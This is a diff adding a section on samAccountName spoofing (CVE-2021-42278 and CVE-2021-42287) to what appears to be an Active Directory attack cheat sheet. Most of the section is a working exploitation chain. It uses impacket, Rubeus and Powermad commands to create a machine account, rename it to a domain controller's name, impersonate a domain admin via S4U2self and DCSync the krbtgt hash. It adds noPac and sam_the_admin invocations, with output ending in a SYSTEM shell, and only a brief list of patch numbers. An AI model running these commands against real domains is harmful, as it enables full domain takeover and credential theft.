@@ -14,6 +14,7 @@
     - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
       - [ZeroLogon](#zerologon)
       - [PrintNightmare](#printnightmare)
+      - [samAccountName spoofing](#samaccountname-spoofing)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
       - [SCF Files](#scf-files)
@@ -670,6 +671,92 @@ Requirements:
 | 0x5    | `rpc_s_access_denied` | Permissions on the file in the SMB share |
 | 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.    |
 | 0x180  | unknown error code  | Share is not SMB2                        |
+
+
+#### samAccountName spoofing
+
+**Requirements**
+* MachineAccountQuota > 0
+
+**Exploitation**
+
+0. Create a computer account
+    ```powershell
+    impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
+
+    powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
+    powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
+    ```
+1. Clear the controlled machine account `servicePrincipalName` attribute
+    ```ps1
+    impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
+
+    powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
+    ```
+2. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$`
+    ```ps1
+    # https://github.com/SecureAuthCorp/impacket/pull/1224
+    impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
+
+    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
+    ```
+3. Request a TGT for the controlled machine account
+    ```ps1
+    impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'
+
+    cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
+    ```
+4. Reset the controlled machine account sAMAccountName to its old value 
+    ```ps1
+    impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
+
+    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
+    ```
+5. (CVE-2021-42287) Request a service ticket with `S4U2self` by presenting the TGT obtained before
+    ```ps1
+    # https://github.com/SecureAuthCorp/impacket/pull/1202
+    impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
+
+    cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
+    ```
+6. DCSync: `KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'`
+
+Automated exploitation:
+
+* [noPac - @cube0x0](https://github.com/cube0x0/noPac)
+    ```powershell
+    noPac.exe scan -domain htb.local -user user -pass 'password123'
+    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
+    noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
+    ```
+* [sam_the_admin - @WazeHell](https://github.com/WazeHell/sam-the-admin)
+    ```ps1
+    $ python3 sam_the_admin.py "caltech/alice.cassie:Lee@tPass" -dc-ip 192.168.1.110 -shell
+    [*] Selected Target dc.caltech.white                                              
+    [*] Total Domain Admins 11                                                        
+    [*] will try to impersonat gaylene.dreddy                                         
+    [*] Current ms-DS-MachineAccountQuota = 10                                        
+    [*] Adding Computer Account "SAMTHEADMIN-11$"                                     
+    [*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
+    [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
+    [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
+    [*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
+    [*] Saving ticket in dc.ccache                                                    
+    [*] Resting the machine account to SAMTHEADMIN-11$                                
+    [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
+    [*] Using TGT from cache                                                          
+    [*] Impersonating gaylene.dreddy                                                  
+    [*]     Requesting S4U2self                                                       
+    [*] Saving ticket in gaylene.dreddy.ccache                                        
+    [!] Launching semi-interactive shell - Careful what you execute                   
+    C:\Windows\system32>whoami                                                        
+    nt authority\system 
+    ```
+
+**Mitigations**:
+* KB5008602
+* [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
+* [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)
 
 
 ### Open Shares
@@ -3256,3 +3343,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
 * [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
 * [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
+* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
+* [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
